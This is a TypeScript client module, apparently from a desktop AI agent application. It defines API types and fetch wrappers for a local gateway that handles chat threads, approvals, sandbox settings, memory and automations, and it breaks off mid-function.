import { chatApi } from "./chatApi";
import { cancelTurn, enqueueTurn, openTurnStream } from "./chatApi";
import { wsSubscription } from "./wsSubscription";
export type { CoreBranchPoint, CoreBranchOption } from "./chatApi";
import {
  DESKTOP_GATEWAY_URL,
  gatewayHeaders,
  keepDesktopAwake,
  pickWorkspaceFolder,
  revealWorkspacePath,
} from "./gatewayConfig";
import {
  gatewayGetJson,
  gatewayPatchJson,
  gatewayPostJson,
  gatewayPutJson,
  gatewayDeleteJson,
  gatewayErrorDetail,
} from "./gatewayHttp";

const BROWSER_CHAT_DEFAULT_MAX_TOKENS = 768;
const BROWSER_CHAT_EXTENDED_MAX_TOKENS = 1_536;
const BROWSER_CHAT_LONG_CODE_MAX_TOKENS = 4_096;

export interface CoreBridgeStatus {
  user_id: string;
  workspace_id: string;
  local_first: boolean;
  cloud_api_enabled: boolean;
  components: Array<{
    id: string;
    label: string;
    status: string;
  }>;
}

export interface CoreChatThread {
  thread_id: string;
  workspace_id?: string | null;
  title: string;
  subtitle: string;
  status: string;
  pinned: boolean;
  computer_session_id: string;
  task_id: string;
  updated_at: string;
  message_count: number;
  source?: string | null;
  channel_recipient?: string | null;
}

export interface CoreChatThreadSnapshot {
  active_thread_id: string;
  threads: CoreChatThread[];
}

export interface CoreChatMessage {
  id: string;
  role: "user" | "assistant" | "system";
  text: string;
  timestamp: string;
  metadata: string | null;
  metrics: CoreChatMessageMetrics | null;
  feedback: "useful" | "not_useful" | null;
  saved_memory_ref: string | null;
  linked_task_id: string | null;
  linked_automation_ref: string | null;
  attachments: CoreChatAttachment[];
  event_parts?: unknown[];
}

export interface CoreChatMessageMetrics {
  prompt_tokens: number;
  generation_tokens: number;
  prompt_tps: number;
  generation_tps: number;
  peak_memory_gb: number;
  elapsed_seconds: number;
  max_tokens: number;
  prompt_build_seconds?: number | null;
  time_to_first_token_seconds?: number | null;
  total_elapsed_seconds?: number | null;
  runtime_status_before?: string | null;
}

export interface CoreChatAttachment {
  artifact_id: string;
  title_redacted: string;
  kind: string;
  size_bytes: number;
  preview_available: boolean;
  privacy_domain: string;
  preview_url?: string;
}

export interface OperationalPromptMessageInput {
  id: string;
  role: "user";
  text: string;
  timestamp: string;
  metadata?: string | null;
  attachments?: ChatAttachmentInput[];
}

export interface CoreChatMessagesSnapshot {
  thread_id: string;
  messages: CoreChatMessage[];
}

export interface CoreTaskItem {
  task_id: string;
  kind: string;
  goal: string;
  status: string;
  priority: string;
  blocked_reason: string | null;
}

export interface CoreApprovelItem {
  approval_id: string;
  task_id: string;
  action: string;
  risk_level: string;
  data_boundary: string;
  explanation: string;
  status: string;
  scope_options?: string[];
  browser_visibility_options?: string[];
  default_browser_visibility?: string;
}

export type ApprovelDecisionOptions = {
  scope?: "once" | "always";
  browser_visibility?: "auto" | "visible" | "headless";
};

export interface CoreTaskQueueSnapshot {
  queued: CoreTaskItem[];
  active: CoreTaskItem[];
  blocked: CoreTaskItem[];
  waiting_approvals: CoreApprovelItem[];
  recent_failures: CoreTaskItem[];
  resource_usage: Array<{
    resource_class: string;
    units: number;
  }>;
}

export interface CoreTaskDetail extends CoreTaskItem {
  latest_checkpoint: unknown | null;
  runtime_metadata: unknown | null;
  exposes_raw_input: boolean;
}

export interface CoreTaskExecutorStatus {
  enabled: boolean;
  worker_id: string;
  poll_interval_ms: number;
  status: string;
  last_tick_at: string | null;
  last_task_id: string | null;
  last_message: string;
  completed_count: number;
  failure_count: number;
}

export interface CoreMemoryDashboard {
  total_memories: number;
  total_entities: number;
  total_relations: number;
  total_wiki_pages: number;
  by_status: Array<{ key: string; count: number }>;
  by_privacy_domain: Array<{ key: string; count: number }>;
  by_sensitivity: Array<{ key: string; count: number }>;
  access_audit_count: number;
}

export interface CoreCapabilitySnapshot {
  connections: Array<{
    id: string;
    provider_id: string;
    display_name: string;
    status: string;
    privacy_domains: string[];
    metadata: unknown;
  }>;
  tools: Array<{
    provider_id: string;
    name: string;
    provider_kind: string;
    action: string;
    description: string;
    privacy_domains: string[];
    sensitivity: string;
  }>;
  policy: {
    enabled_providers: string[];
    allow_managed_cloud: boolean;
    privacy_domains: string[];
    max_autonomy_level: number;
  };
}

export interface CoreComputerSessionSnapshot {
  computer_session_id: string;
  task_id: string;
  workflow_id: string | null;
  user_id: string;
  workspace_id: string;
  status: string;
  active_surface: string;
  surfaces: Array<{
    surface: string;
    label: string;
    status: string;
    detail_redacted: string | null;
  }>;
  activity_title: string;
  activity_subtitle: string;
  progress_current: number;
  progress_total: number;
  elapsed_seconds: number;
  preview_frame_ref: string | null;
  current_url_redacted: string | null;
  terminal_excerpt_redacted: string[];
  artifact_refs: Array<{
    artifact_id: string;
    title_redacted: string;
    kind: string;
    size_bytes: number;
    preview_ref: string | null;
    created_at: string;
  }>;
  timeline: Array<{
    event_id: string;
    surface: string;
    kind: string;
    status: string;
    title: string;
    subtitle_redacted: string;
    markdown_redacted: string | null;
    artifact_refs: string[];
    started_at: string;
    completed_at: string | null;
    approval_required: boolean;
    payload_redacted: boolean;
  }>;
  approval_state: string;
  takeover_state: string;
  risk_level: string;
  last_error_redacted: string | null;
  updated_at: string;
}

export interface CoreComputerArtifactPreview {
  artifact_id: string;
  title_redacted: string;
  kind: string;
  size_bytes: number;
  data_url: string;
}

export interface CorePromptMessage {
  id: string;
  role: "user" | "assistant" | "system";
  text: string;
  timestamp: string;
  metadata: string | null;
  metrics: CoreChatMessageMetrics | null;
  attachments?: CoreChatAttachment[];
  event_parts?: unknown[];
}

export interface CorePromptSubmissionResult {
  user_message: CorePromptMessage;
  assistant_message: CorePromptMessage;
  computer_session: CoreComputerSessionSnapshot;
  plan: CorePromptExecutionPlan | null;
  /** Model that actually produced the answer (from the gateway's x-effective-model
   *  header) — the per-message override or the role default for this turn. */
  effective_model?: string | null;
}

export interface ChatAttachmentInput {
  localPath: string;
  displayName: string;
  mimeType: string;
  sizeBytes: number;
}

/** A directory entry for the Workbench File tab (project folder browser). */
export interface FsEntry {
  name: string;
  path: string;
  is_dir: boolean;
  size: number;
}

export interface FsListResult {
  path: string | null;
  entries: FsEntry[];
  authorized: boolean;
  root: string | null;
}

/** File content + git HEAD version for the Workbench File-tab viewer/diff. */
export interface FsFilePayload {
  authorized: boolean;
  path: string;
  text: string;
  old_text: string;
  in_git: boolean;
  modified: boolean;
  binary: boolean;
  error?: string;
}

export interface CoreChatStreamDelta {
  type: "delta";
  request_id: string;
  delta: string;
}

/** B2 (Piano UI) — payload tipizzati dei ChatEventPart. Definiti qui (lower layer)
 *  e re-esportati da `types.ts` per evitare un import circolare. Le shape vengono
 *  dai parser runtime in ChatView (un tempo `unknown`). */

/** Prompt di una scelta singola/multipla che il modello pone all'utente. */
export interface ChoicePromptPayload {
  question: string;
  multi: boolean;
  options: string[];
  /** Set for PROACTIVITY-origin questions (onboarding, follow-up, …): answering captures
   *  the pick as memory instead of running an agent turn. Absent for in-task model choices. */
  purpose?: string;
}

/** Proposta di salvataggio di un segreto nel vault. */
export interface VaultProposePayload {
  category: string;
  label: string;
  redacted_preview: string;
  pending_id?: string;
}

/** Rivelazione di un segreto già in vault. */
export interface VaultRevealPayload {
  record_id: string;
  category: string;
  label: string;
  redacted_preview: string;
}

/** Richiesta di approvazione di un pagamento — snapshot immutabile. */
export interface PaymentApprovalPayload {
  snapshot: PaymentApprovalSnapshot;
}

/** Risultato di un tool eseguito dal modello. Contratto lasso (nessun consumer
 *  tipizzato oggi); stringere quando recall/structured output lo richiederà. */
export interface ToolResultPayload {
  name?: string;
  output?: unknown;
}

/** A1 (Piano UI): risultato di una recall RAG episodica. NON ancora renderizzato
 *  (A2 fase recalling + A3 badge = tappe successive). `scope` rispetta l'invariant
 *  Personale↔Progetto (recall sempre within-scope). */
export interface RecallHitPayload {
  ref: string;
  text: string;
  score: number;
  type: string;
  /** Canonical workspace that supplied this hit (including __personal__). */
  source_workspace_id: string;
  /** Human-readable source label resolved by the gateway for this turn. */
  source_label: string;
  /** System collection that classified/authorized the record. */
  collection: string;
  /** Direct grant used for a linked source; omitted for the local source. */
  grant_id?: string | null;
  /** The recall coordinator detected a semantic conflict for this hit. */
  conflict: boolean;
}

/** D3 (Piano UI): una modifica di codice proposta dal modello (diff inline). */
export interface DiffEventPayload {
  path: string;
  label?: string;
  old?: string;
  new: string;
  language?: string;
}
export interface RecallEventPayload {
  query: string;
  hits: RecallHitPayload[];
  scope: "personal" | "project";
}

export type CoreChatStreamEvent =
  | CoreChatStreamDelta
  | { type: "reasoning"; request_id: string; text: string }
  | { type: "activity"; request_id: string; text: string }
  | { type: "plan_update"; request_id: string; markdown: string }
  | { type: "choice_prompt"; request_id: string; payload: ChoicePromptPayload }
  | { type: "vault_propose"; request_id: string; payload: VaultProposePayload }
  | { type: "vault_reveal"; request_id: string; payload: VaultRevealPayload }
  | { type: "payment_approval"; request_id: string; payload: PaymentApprovalPayload }
  | { type: "tool_result"; request_id: string; payload: ToolResultPayload }
  | { type: "recall"; request_id: string; payload: RecallEventPayload }
  | { type: "diff"; request_id: string; payload: DiffEventPayload }
  | { type: "done"; request_id: string }
  | { type: "error"; request_id: string; message?: string };

export interface CorePromptExecutionPlan {
  title: string;
  summary: string;
  risk_level: string;
  steps: CorePromptPlanStep[];
}

export interface CorePromptPlanStep {
  step_id: string;
  title: string;
  detail: string;
  surface: string;
  action_kind: string;
  requires_user_approval: boolean;
  target_url?: string | null;
}

export interface CorePromptPlanStepRunResult {
  status: string;
  task_id: string | null;
  message: string;
}

export interface CorePromptPlanBatchRunResult {
  status: string;
  completed: number;
  stopped_reason: string | null;
  results: CorePromptPlanStepRunResult[];
}

export interface ActiveModelInfo {
  backend: string;
  model: string;
  locality: string;
  context_window: number;
  capable: boolean;
  missing_api_key: boolean;
}

export interface WorkspaceRecord {
  id: string;
  name: string;
  folder?: string | null;
  // ADR 0023 per-workspace policy overrides. Absent/null → this project inherits the global
  // `RuntimeSettings` default. Set → overrides that axis for every thread in the project.
  sandbox_mode?: string | null;
  approval_policy?: string | null;
  // Phase 2 — extra writable folders (beyond the always-writable project root). An array
  // (even empty) is an explicit override; absent/null inherits the global default.
  writable_roots?: string[] | null;
  // Phase 3 — skill-confirmation categories that must ALWAYS confirm in this project
  // (`delete|financial|medical|sensitive-data`). Array = override; absent/null inherits.
  skill_confirmations?: string[] | null;
}

export interface WorkspacesSnapshot {
  active_workspace_id: string;
  workspaces: WorkspaceRecord[];
}

export interface ProjectAccessGrant {
  workspace_id: string;
  contact_reference: string;
  contact_name: string;
  channel: string;
  can_trigger_automations: boolean;
  can_use_project_memory: boolean;
  can_receive_replies: boolean;
  can_receive_artifacts: boolean;
  capability_denies: string[];
  updated_at: number;
}

export type ProjectAccessInput = Omit<ProjectAccessGrant, "workspace_id" | "updated_at">;

export type MemoryCollectionKey =
  | "preferences"
  | "profile"
  | "knowledge"
  | "decisions"
  | "goals"
  | "artifacts"
  | "episodes";

export interface MemorySourceGrantView {
  id: string | null;
  source_workspace_id: string;
  source_label: string;
  source_available: boolean;
  local: boolean;
  read_only: boolean;
  collections: MemoryCollectionKey[];
  max_sensitivity: "public" | "internal" | "private" | "confidential";
  expires_at?: number | null;
  revoked_at?: number | null;
  policy_version: number;
  last_used_at?: number | null;
}

export interface MemorySourceUpsertInput {
  source_workspace_id: string;
  collections: MemoryCollectionKey[];
  max_sensitivity: MemorySourceGrantView["max_sensitivity"];
  expires_at?: number | null;
  overrides: Array<{ memory_ref: string; effect: "allow" | "deny" }>;
}

export interface MemorySourceCandidateView {
  ref: string;
  summary: string;
  type: string;
  collection: MemoryCollectionKey;
  sensitivity: MemorySourceGrantView["max_sensitivity"];
}

export interface MemorySourceCandidatePagination {
  offset?: number;
  limit?: number;
}

export interface ComposioConnectResult {
  provider_id: string;
  tools_cached: number;
}

export interface BrowserStep {
  label: string;
  status: string;
}

export interface ContainedComputerLive {
  enabled: boolean;
  thread_id?: string | null;
  novnc_url: string | null;
  /** True only while a browse_web is actually running right now. */
  active: boolean;
  /** Current activity (goal) when active. */
  activity: string | null;
  /** Steps executed so far — the live "Activity progress" checklist. */
  steps: BrowserStep[];
  /** True while a CLI skill command is running in the contained computer. */
  terminal_active: boolean;
  /** Terminal commands + output for the current response (CLI skills). */
  terminal: TerminalEntry[];
}

export interface TerminalEntry {
  command: string;
  output: string;
  running: boolean;
}

export interface McpConnectResult {
  provider_id: string;
  connection_id: string;
  tools_cached: number;
  discovery_error: string | null;
}

export interface ComposioToolkit {
  slug: string;
  name: string;
  managed_oauth: boolean;
  no_auth: boolean;
  logo?: string;
  description?: string;
  categories?: string[];
}

export interface ComposioLinkResult {
  redirect_url: string;
  connected_account_id: string;
}

export interface ComposioConnection {
  id: string;
  toolkit_slug: string;
  status: string;
}

/** A real-time UI event pushed by the gateway over /api/events. */
export interface AppEvent {
  type: string;
  thread_id?: string;
  workspace?: string;
  channel?: string;
  source?: string;
  title?: string;
  turn_id?: string;
  user_message_id?: string;
  assistant_message_id?: string;
}

/**
 * Subscribes to the gateway's real-time event stream (NDJSON over HTTP, the same
 * push idiom the chat stream uses). Invokes `onEvent` for each event — e.g.
 * `thread.turn_started` when an inbound Telegram/WhatsApp/scheduled turn has
 * already persisted its visible user bubble and assistant placeholder.
 * Auto-reconnects on drop. Returns an unsubscribe function.
 */
export function subscribeAppEvents(onEvent: (event: AppEvent) => void): () => void {
  let stopped = false;
  let controller: AbortController | null = null;

  async function connect() {
    while (!stopped) {
      controller = new AbortController();
      try {
        const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/events`, {
          headers: gatewayHeaders(),
          signal: controller.signal,
        });
        if (!response.ok || !response.body) throw new Error(`events HTTP ${response.status}`);
        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        let buffer = "";
        for (;;) {
          const { value, done } = await reader.read();
          if (done) break;
          buffer += decoder.decode(value, { stream: true });
          let nl: number;
          while ((nl = buffer.indexOf("\n")) >= 0) {
            const line = buffer.slice(0, nl).trim();
            buffer = buffer.slice(nl + 1);
            if (!line) continue;
            try {
              onEvent(JSON.parse(line) as AppEvent);
            } catch {
              // ignore a malformed line
            }
          }
        }
      } catch {
        if (stopped) return;
      }
      if (stopped) return;
      // Reconnect after a short backoff (gateway restart, transient drop, …).
      await new Promise((resolve) => setTimeout(resolve, 1500));
    }
  }

  void connect();
  return () => {
    stopped = true;
    controller?.abort();
  };
}

async function electronRuntimeModel(): Promise<ActiveModelInfo> {
  return gatewayGetJson<ActiveModelInfo>("/api/runtime/model");
}

async function electronContainedComputerLive(): Promise<ContainedComputerLive> {
  return gatewayGetJson<ContainedComputerLive>("/api/local-computer/live");
}

export interface LocalComputerActionResult {
  ok: boolean;
  enabled: boolean;
  message: string | null;
}

async function electronStartLocalComputer(): Promise<LocalComputerActionResult> {
  return gatewayPostJson<LocalComputerActionResult>("/api/local-computer/start", {});
}

async function electronStopLocalComputer(): Promise<LocalComputerActionResult> {
  return gatewayPostJson<LocalComputerActionResult>("/api/local-computer/stop", {});
}

export interface UpdateInfo {
  /** Server deploy with a redeploy webhook configured (Coolify/PaaS). */
  webhook_configured: boolean;
}

async function electronUpdateInfo(): Promise<UpdateInfo> {
  return gatewayGetJson<UpdateInfo>("/api/update/info");
}

export interface UpdateTriggerResult {
  ok: boolean;
  message: string | null;
}

async function electronTriggerUpdate(): Promise<UpdateTriggerResult> {
  return gatewayPostJson<UpdateTriggerResult>("/api/update/trigger", {});
}

export interface SystemStatus {
  docker: { installed: boolean; running: boolean; container_up: boolean };
  contained_enabled: boolean;
  contained_cdp_ok: boolean;
  gateway_memory_mb: number;
  container_memory_mb: number | null;
  browser_sessions: number;
}

export interface CloseAllBrowsersResult {
  closed_sessions: number;
  closed_tabs: number;
}

export interface ProviderModelsGroup {
  provider_id: string;
  label: string;
  /** Provider endpoint — lets the picker badge each model 💻 local vs ☁️ cloud. */
  base_url?: string;
  models: string[];
}

export interface RuntimeModelsList {
  active: string | null;
  backend: string;
  available: string[];
  groups: ProviderModelsGroup[];
}

/** Whether a model runs in the cloud (☁️) vs on this machine (💻): true when the
 * model id carries an Ollama cloud tag (`:cloud`/`-cloud`) OR its provider endpoint
 * is remote (not localhost). Engine-authoritative, the name tag as a fallback. */
export function modelIsCloud(baseUrl: string | undefined, modelId: string): boolean {
  const m = modelId.toLowerCase();
  if (m.includes(":cloud") || m.includes("-cloud")) return true;
  const b = (baseUrl ?? "").toLowerCase();
  if (!b) return false;
  const local =
    b.includes("127.0.0.1") ||
    b.includes("localhost") ||
    b.includes("0.0.0.0") ||
    b.includes("[::1]") ||
    b.includes("://::1");
  return !local;
}

export interface InferenceProvider {
  base_url: string | null;
  model: string | null;
  has_key: boolean;
}

async function electronRuntimeProvider(): Promise<InferenceProvider> {
  return gatewayGetJson<InferenceProvider>("/api/runtime/provider");
}

async function electronSetRuntimeProvider(input: {
  base_url?: string;
  model?: string;
  api_key?: string;
}): Promise<{ ok: boolean }> {
  return gatewayPostJson<{ ok: boolean }>("/api/runtime/provider", input);
}

async function electronRuntimeModels(threadId?: string): Promise<RuntimeModelsList> {
  const query = threadId ? `?thread_id=${encodeURIComponent(threadId)}` : "";
  return gatewayGetJson<RuntimeModelsList>(`/api/runtime/models${query}`);
}

async function electronSetRuntimeModel(model: string): Promise<{ active: string }> {
  return gatewayPostJson<{ active: string }>("/api/runtime/model", { model });
}

/** Persisted runtime/behaviour axes (GET returns all three). Maps 1:1 to the gateway
 *  `RuntimeSettings` struct the chat path resolves live:
 *  - `adaptive_floor` (ADR 0018): "off" | "shadow" | "on"
 *  - `sandbox_mode` (ADR 0023): "read-only" | "workspace-write" | "danger"
 *  - `approval_policy` (ADR 0023): "untrusted" | "on-failure" | "on-request" | "never" */
export interface RuntimeSettings {
  adaptive_floor: string;
  sandbox_mode: string;
  approval_policy: string;
  /** Phase 2 — global default extra writable folders (empty = only the project root). */
  writable_roots: string[];
  /** Phase 3 — global default skill-confirmation categories (empty = none forced). */
  skill_confirmations: string[];
  /** Auto-start the local computer (contained Docker sandbox) at app launch, opening Docker
   *  if closed. Default true. */
  local_computer_autostart?: boolean;
}

async function electronRuntimeSettings(): Promise<RuntimeSettings> {
  return gatewayGetJson<RuntimeSettings>("/api/runtime/settings");
}

// PATCH semantics: each Settings control posts ONLY its own field. The gateway merges the
// partial onto the persisted object (see `merge_runtime_settings`), so a partial never
// clobbers the sibling axes.
async function electronSetRuntimeSettings(
  settings: Partial<RuntimeSettings>,
): Promise<RuntimeSettings> {
  return gatewayPostJson<RuntimeSettings>("/api/runtime/settings", settings);
}

export interface TimezoneInfo {
  /** User's explicit IANA choice, or null when following the system zone. */
  selected: string | null;
  /** The zone actually in effect (choice or detected system zone). */
  effective: string;
  /** Live "now" line in the effective zone, as the model sees it. */
  now: string;
}

async function electronTimezone(): Promise<TimezoneInfo> {
  return gatewayGetJson<TimezoneInfo>("/api/prefs/timezone");
}

async function electronSetTimezone(timezone: string | null): Promise<TimezoneInfo> {
  return gatewayPostJson<TimezoneInfo>("/api/prefs/timezone", { timezone });
}

export interface LanguageInfo {
  /** User's explicit ISO-639-1 choice, or null when following the default ("en"). */
  selected: string | null;
  /** The code actually in effect (choice or default "en"). */
  effective: string;
  /** Human-readable name for the effective language. */
  effective_name: string;
  /** All supported languages as [code, native name] pairs for the picker. */
  supported: Array<[string, string]>;
}

async function electronLanguage(): Promise<LanguageInfo> {
  return gatewayGetJson<LanguageInfo>("/api/prefs/language");
}

async function electronSetLanguage(language: string | null): Promise<LanguageInfo> {
  return gatewayPostJson<LanguageInfo>("/api/prefs/language", { language });
}

// ── Onboarding setup wizard ──────────────────────────────────────────────

export interface SetupStatus {
  needs_setup: boolean;
  setup_complete: boolean;
  docker_installed: boolean;
  docker_running: boolean;
  has_provider: boolean;
  provider_kind: string | null;
}

export interface LlmValidationResult {
  valid: boolean;
  models: string[];
  models_count: number;
}

async function electronSetupStatus(): Promise<SetupStatus> {
  return gatewayGetJson<SetupStatus>("/api/setup/status");
}

async function electronValidateLlm(
  kind: string,
  baseUrl: string,
  apiKey: string | null,
): Promise<LlmValidationResult> {
  return gatewayPostJson<LlmValidationResult>("/api/setup/validate-llm", {
    kind,
    base_url: baseUrl,
    api_key: apiKey,
  });
}

async function electronCompleteSetup(): Promise<{ setup_complete: boolean }> {
  return gatewayPostJson<{ setup_complete: boolean }>("/api/setup/complete", {});
}

export interface OllamaSetupModel {
  name: string;
  size: number;
}
export interface OllamaSetupStatus {
  running: boolean;
  base_url: string;
  models: OllamaSetupModel[];
}

async function electronOllamaSetup(): Promise<OllamaSetupStatus> {
  return gatewayGetJson<OllamaSetupStatus>("/api/setup/ollama");
}

export interface PullProgress {
  status: string;
  total?: number;
  completed?: number;
}

/** Pull a local Ollama model, forwarding the native NDJSON progress lines to
 *  `onProgress` (status + total/completed bytes for a progress bar). Resolves when
 *  the stream ends; rejects on an error line or a non-OK response. */
async function electronPullModel(
  model: string,
  onProgress: (progress: PullProgress) => void,
): Promise<void> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/setup/pull-model`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({ model }),
  });
  if (!response.ok || !response.body) {
    throw new Error(await gatewayErrorDetail(response));
  }
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buffer = "";
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    buffer += decoder.decode(value, { stream: true });
    let nl: number;
    while ((nl = buffer.indexOf("\n")) >= 0) {
      const line = buffer.slice(0, nl).trim();
      buffer = buffer.slice(nl + 1);
      if (!line) continue;
      let parsed: (PullProgress & { error?: string }) | null = null;
      try {
        parsed = JSON.parse(line);
      } catch {
        parsed = null;
      }
      if (!parsed) continue;
      if (parsed.error) throw new Error(parsed.error);
      onProgress(parsed);
    }
  }
}

export interface ApprovelRouting {
  /** "in_app" | "telegram" | "whatsapp". */
  channel: string;
  /** The user's own number/chat id on that channel (only it can authorize remotely). */
  target: string | null;
}

async function electronApprovelRouting(): Promise<ApprovelRouting> {
  return gatewayGetJson<ApprovelRouting>("/api/prefs/approval-routing");
}

export interface ChannelIdentity {
  id: string;
  name: string;
}

async function electronChannelIdentities(channel: string): Promise<ChannelIdentity[]> {
  try {
    const r = await fetch(
      `${DESKTOP_GATEWAY_URL}/api/prefs/channel-identities?channel=${encodeURIComponent(channel)}`,
      { headers: gatewayHeaders() },
    );
    if (!r.ok) return [];
    const data = (await r.json()) as { identities?: ChannelIdentity[] };
    return data.identities ?? [];
  } catch {
    return [];
  }
}

async function electronSetApprovelRouting(
  channel: string,
  target: string | null,
): Promise<ApprovelRouting> {
  return gatewayPostJson<ApprovelRouting>("/api/prefs/approval-routing", { channel, target });
}

async function electronImprovePrompt(prompt: string): Promise<string> {
  const { improved } = await gatewayPostJson<{ improved: string }>(
    "/api/chat/improve_prompt",
    { prompt },
  );
  return improved;
}

async function electronAutoTitleThread(
  threadId: string,
  prompt: string,
  answer: string,
): Promise<void> {
  await gatewayPostJson(`/api/chat/threads/${encodeURIComponent(threadId)}/autotitle`, {
    prompt,
    answer,
  });
}

async function electronChatSuggestions(prompt: string, answer: string): Promise<string[]> {
  const { suggestions } = await gatewayPostJson<{ suggestions: string[] }>(
    "/api/chat/suggestions",
    { prompt, answer },
  );
  return suggestions;
}

async function electronArtifactBlob(
  thread: string,
  name: string,
  version?: number,
): Promise<Blob> {
  const versionParam = version !== undefined ? `&version=${version}` : "";
  const response = await fetch(
    `${DESKTOP_GATEWAY_URL}/api/artifacts/file?thread=${encodeURIComponent(thread)}&name=${encodeURIComponent(name)}${versionParam}`,
    { headers: gatewayHeaders() },
  );
  if (!response.ok) {
    throw new Error(`Download artifact HTTP ${response.status}`);
  }
  return response.blob();
}

async function electronArtifactPdfPages(
  thread: string,
  name: string,
  version?: number,
): Promise<string[]> {
  const versionParam = version !== undefined ? `&version=${version}` : "";
  const { pages } = await gatewayGetJson<{ pages: string[] }>(
    `/api/artifacts/pdf-pages?thread=${encodeURIComponent(thread)}&name=${encodeURIComponent(name)}${versionParam}`,
  );
  return pages ?? [];
}

async function electronSaveArtifactContent(
  thread: string,
  name: string,
  content: string,
): Promise<void> {
  await gatewayPostJson("/api/artifacts/content", { thread, name, content });
}

export type MemoryGraphNode = {
  id: string;
  kind: string; // project | decision | file | alternative | fact | preference | entity
  label: string;
  detail: string;
  entity_type: string;
};
export type MemoryGraphEdge = { source: string; target: string; label: string };
export type MemoryGraph = {
  workspace: string;
  nodes: MemoryGraphNode[];
  edges: MemoryGraphEdge[];
  /** True when a large code graph was reduced to its most-connected backbone for drawing. */
  truncated?: boolean;
  /** Total nodes before truncation (for the "N di M" banner). */
  total_nodes?: number;
};

export type MemoryHygieneSuggestion = {
  survivor_ref: string;
  absorbed_ref: string;
  survivor_label: string;
  absorbed_label: string;
  reason: string;
  safe_auto_merge: boolean;
  confidence: number;
};

function scopeQuery(thread?: string, workspace?: string): string {
  const qs = new URLSearchParams();
  if (thread) qs.set("thread", thread);
  else if (workspace) qs.set("workspace", workspace);
  const s = qs.toString();
  return s ? `?${s}` : "";
}

async function electronMemoryGraph(thread?: string, workspace?: string): Promise<MemoryGraph> {
  return gatewayGetJson<MemoryGraph>(`/api/memory/graph${scopeQuery(thread, workspace)}`);
}

async function electronMergeMemoryEntities(
  survivorRef: string,
  absorbedRef: string,
  reason?: string,
): Promise<void> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/memory/graph/merge`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({
      survivor_ref: survivorRef,
      absorbed_ref: absorbedRef,
      reason,
    }),
  });
  if (!response.ok) {
    throw new Error(`Desktop Gateway memory graph merge HTTP ${response.status}`);
  }
}

async function electronMemoryHygieneSuggestions(
  thread?: string,
  workspace?: string,
): Promise<MemoryHygieneSuggestion[]> {
  const { suggestions } = await gatewayGetJson<{ suggestions: MemoryHygieneSuggestion[] }>(
    `/api/memory/hygiene/suggestions${scopeQuery(thread, workspace)}`,
  );
  return suggestions ?? [];
}

export type MemoryWikiPage = { path: string; title: string; body: string };

async function electronMemoryWiki(thread?: string, workspace?: string): Promise<MemoryWikiPage[]> {
  return gatewayGetJson<MemoryWikiPage[]>(`/api/memory/wiki${scopeQuery(thread, workspace)}`);
}

// ── First-class automations (the trigger→action rules) ────────────────────────
export type AutomationEventJson =
  | { kind: "channel_message"; channel?: string | null; from?: string | null }
  | { kind: "email_received"; from?: string | null }
  | { kind: "file_changed"; path: string }
  | { kind: "memory_updated"; topic?: string | null }
  | {
      kind: "connector_poll";
      tool: string;
      args?: unknown;
      key_field: string;
      label?: string | null;
    };

export type EventSource = { group: string; tool: string; label: string; key_field: string };
export type EventSources = {
  channels: { id: string; label: string }[];
  connectors: EventSource[];
};

async function electronAutomationEventSources(): Promise<EventSources> {
  const fallback: EventSources = {
    channels: [
      { id: "whatsapp", label: "WhatsApp" },
      { id: "telegram", label: "Telegram" },
    ],
    connectors: [],
  };
  try {
    const r = await fetch(`${DESKTOP_GATEWAY_URL}/api/automations/event-sources`, {
      headers: gatewayHeaders(),
    });
    if (!r.ok) return fallback;
    return (await r.json()) as EventSources;
  } catch {
    return fallback;
  }
}

export type AutomationTriggerJson =
  | { type: "schedule"; recurrence: string; tz?: string | null }
  | { type: "event"; event: AutomationEventJson };

export type ManagedAutomation = {
  id: string;
  title: string;
  trigger: AutomationTriggerJson;
  trigger_summary: string;
  prompt: string;
  approval: "confirm" | "autonomous";
  enabled: boolean;
  source: "chat" | "mining" | "manual";
  task_id: string | null;
  created_at: number;
  updated_at: number;
  last_fired_at: number | null;
  next_run: number | null;
};

export type AutomationCreateteInput = {
  title: string;
  trigger: AutomationTriggerJson;
  prompt: string;
  workspace_id?: string | null;
  approval?: "confirm" | "autonomous";
  source?: "chat" | "mining" | "manual";
};

function automationScopeSuffix(workspaceId?: string | null): string {
  const value = workspaceId?.trim();
  return value ? `?workspace_id=${encodeURIComponent(value)}` : "";
}

async function electronAutomations(workspaceId?: string | null): Promise<ManagedAutomation[]> {
  const response = await fetch(
    `${DESKTOP_GATEWAY_URL}/api/automations${automationScopeSuffix(workspaceId)}`,
    {
      headers: gatewayHeaders(),
    },
  );
  if (!response.ok) return [];
  const body = (await response.json()) as { automations: ManagedAutomation[] };
  return body.automations ?? [];
}

async function electronCreateteAutomation(
  input: AutomationCreateteInput,
): Promise<ManagedAutomation> {
  const response = await fetch(`${DESKTOP_GATEWAY_URL}/api/automations`, {
    method: "POST",
    headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(input),
  });
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(`create automation HTTP ${response.status} ${detail}`);
  }
  return (await response.json()) as ManagedAutomation;
}

async function electronUpdateAutomation(
  id: string,
  input: Partial<AutomationCreateteInput>,
  workspaceId?: string | null,
): Promise<ManagedAutomation> {
  const response = await fetch(
    `${DESKTOP_GATEWAY_URL}/api/automations/${encodeURIComponent(id)}${automationScopeSuffix(
      workspaceId,
    )}`,
    {
      method: "PUT",
      headers: { ...gatewayHeaders(), "Content-Type": "application/json" },
      body: JSON.stringify(input),
    },
  );
  if (!response.ok) {
    const detail = await response.text().catch(() => "");
    throw new Error(`update automation HTTP ${response.status} ${detail}`);
  }
  return (await response.json()) as ManagedAutomation;
}

async function electronToggleAutomation(
  id: string,
  workspaceId?: string | null,
): Promise<ManagedAutomation> {
  const response = await fetch(
    `${DESKTOP_GATEWAY_URL}/api/automations/${encodeURIComponent(
      id,
    )}/toggle${automationScopeSuffix(workspaceId)}`,
    { method: "POST", headers: gatewayHeaders() },
  );
  if (!response.ok) throw new Error(`toggle automation HTTP ${response.status}`);
